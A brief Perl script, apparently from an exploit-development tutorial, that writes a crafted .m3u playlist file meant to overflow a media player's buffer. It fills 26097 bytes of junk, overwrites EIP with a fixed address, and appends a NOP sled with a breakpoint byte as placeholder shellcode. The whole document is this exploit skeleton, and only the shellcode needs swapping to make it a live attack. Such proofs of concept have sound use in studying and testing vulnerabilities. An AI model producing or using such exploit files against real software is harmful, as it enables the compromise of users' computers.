#!/usr/bin/env perl

my $file= "test1.m3u";
my $junk= "A" x 26097;
my $eip = pack('V',0x000ff690);  

my $shellcode = "\x90" x 25; 

$shellcode = $shellcode."\xcc";
$shellcode = $shellcode."\x90" x 25; 

open($FILE,">$file");
print $FILE $junk.$eip.$shellcode;
close($FILE);
print "m3u File Created successfully\n";
